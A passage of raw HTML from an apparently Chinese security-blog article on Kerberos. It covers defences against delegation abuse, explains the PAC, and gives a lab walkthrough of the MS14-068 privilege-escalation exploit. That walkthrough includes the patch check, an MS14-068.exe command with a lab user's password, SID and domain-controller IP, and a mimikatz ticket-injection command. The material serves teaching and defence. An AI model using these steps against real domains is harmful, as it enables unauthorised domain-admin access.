onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaI9SdgibjQwVL4tzNjC1ia38HzlriaepibnI3vBlSQmZpxzGsmEnbUOiaSxMQ/640?wx_fmt=png'" data-type="png" data-w="637" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);">域委派的防御措施</h2><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />因为委派比较实用我们也不能说直接简单粗暴关闭该功能。<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />1.高权限用户可以设置不能被委派<br style="-webkit-tap-highlight-color: transparent;"  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="1.2206235011990407" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/71_5zugp9lQHHTslBEOD9ZUGGRibps7uQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIF925W7ySmticrMSb6W5ichDIQAK5zugp9lQHHTslBEOD9ZUGGRibps7uQ/640?wx_fmt=png'" data-type="png" data-w="417" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.8025078369905956" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/72_EicRSAP12WRgo0jYDwYicYEcoc9uuw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIRS9ALwPnPric9setbszXO1st9GeEicRSAP12WRgo0jYDwYicYEcoc9uuw/640?wx_fmt=png'" data-type="png" data-w="638" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />可以看到administrator是无法成功的，但是sqladmin可以<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />2.Windows 2012 R2及更高的系统建立了受保护的用户组，组内用户不允许被委派，这是有效的手段。受保护的用户组，当这个组内的用户登录时（windows 2012 R2域服务器，客户端必须为Windows 8.1或之上），不能使用NTLM认证；适用于<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">Windows Server 2016</code>，<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">Windows Server 2012 R2</code>、&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">Windows Server 2012</code><br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />3.一般TGT 4小时后失效<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />4.Kerberos预认证时不使用DES或者RC4等加密算法；<br style="-webkit-tap-highlight-color: transparent;"  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h1 style="margin: 2em auto 1em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 1em;padding-left: 1em;border-bottom: 2px solid rgb(15, 76, 129);">PAC</h1><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">具体查看：[Windows内网协议学习Kerberos篇之PAC]</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">https://www.anquanke.com/post/id/192810</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />kerberos的流程：<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />1.用户向KDC发起AS_REQ,请求凭据是用户hash加密的时间戳，KDC使用用户hash进行解密，如果结果正确返回用krbtgt hash加密的TGT票据<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />2.用户凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求，KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据<br style="-webkit-tap-highlight-color: transparent;"  />3.用户拿着TGS票据去请求服务，服务使用自己的hash解密TGS票据。如果解密正确，就允许用户访问。<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />上面这个流程看起来没错，却忽略一个最重要的因素，那就是用户有没有权限访问该服务，在上面的流程里面，只要用户的hash正确，那么就可以拿到TGT，有了TGT，就可以拿到TGS，有了TGS，就可以访问服务，任何一个用户都可以访问任何服务。也就是说上面的流程解决了”Who am i?”的问题，并没有解决 “What can I do?”的问题。<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />在Kerberos最初设计的流程里说明了如何证明客户端的真实身份，但是并没有说明客户端是否有权限访问该服务，因为在域中不同权限的用户能够访问的资源是不同的。所以微软为了解决权限这个问题，引入了 PAC (Privilege Attribute Certificate，特权属性证书) 的概念。<br style="-webkit-tap-highlight-color: transparent;"  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);">MS14-068</h2><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />MS14-068编号CVE-2014-6324，补丁为3011780，如果自检可在域控制器上使用命令检测。<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  /></p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">systeminfo </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">|</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">find </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"3011780"</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">为空说明该服务器存在MS14-068漏洞<br style="-webkit-tap-highlight-color: transparent;"  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">环境：<br style="-webkit-tap-highlight-color: transparent;"  />域机器：PC-JACK-0DAY，win7，知道一个域用户和密码：jack\0day，admin!@#45，拥有该机器的管理员权限<br style="-webkit-tap-highlight-color: transparent;"  />域控：OWA2010SP3，ip:192.168.3.142<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  /><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">1.生成票据</strong><br style="-webkit-tap-highlight-color: transparent;"  /><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;"></strong><br style="-webkit-tap-highlight-color: transparent;"  /></p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">MS14</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">068.exe</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">u jack@0day</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">p admin</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">!@#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">45</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">s S</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">21</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1812960810</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">2335050734</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">3517558805</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1133</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">d </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">192.168</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">3.142</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">  </span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">#MS14-068.exe -u 域用户@0day.org -p 域用户jack密码 -s 域用户jack的SID -d 域控ip</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.35857805255023184" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/73_I4CrgedLvdlDWSyhmX8BNhGYPqm5DA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIM28RP5fWE0XY1mxAibenh8DIHI4CrgedLvdlDWSyhmX8BNhGYPqm5DA/640?wx_fmt=png'" data-type="png" data-w="1294" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />可以看到生成了TGT_jack@0day.org.ccache<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  /><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">2.mimikatz导入票据</strong><br style="-webkit-tap-highlight-color: transparent;"  /><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;"></strong><br style="-webkit-tap-highlight-color: transparent;"  /></p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kerberos</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ptc </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">票据路径</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.22590673575129533" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/74_icfZXv5woQfoR48ew2ohKdOvc6Ll9Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIgzqNtAXgoLWibuWIXkQCjMjAFOicfZXv5woQfoR48ew2ohKdOvc6Ll9Q/640?wx_fmt=png'" data-type="png" data-w="965" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  /><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">3.访问域控</strong><br style="-webkit-tap-highlight-color: transparent;"  /><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;"></strong></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.35857805255023184" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/75_I4CrgedLvdlDWSyhmX8BNhGYPqm5DA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIM28RP5fWE0XY1mxAibenh8DIHI4CrgedLvdlDWSyhmX8BNhGYPqm5DA/640?wx_fmt=png'" data-type="png" data-w="1294" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255);" class="js_darkmode__0" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);color: rgb(163, 163, 163) !important;"><img data-ratio="0.109375" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/76_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" data-type="png" data-w="640" style="box-sizing: border-box !important;visibility: visible !important;width: 640px !important;height: auto !important;"  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255);" class="js_darkmode__1" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);color: rgb(163, 163, 163) !important;"><br data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)"  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" class="js_darkmode__2" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: 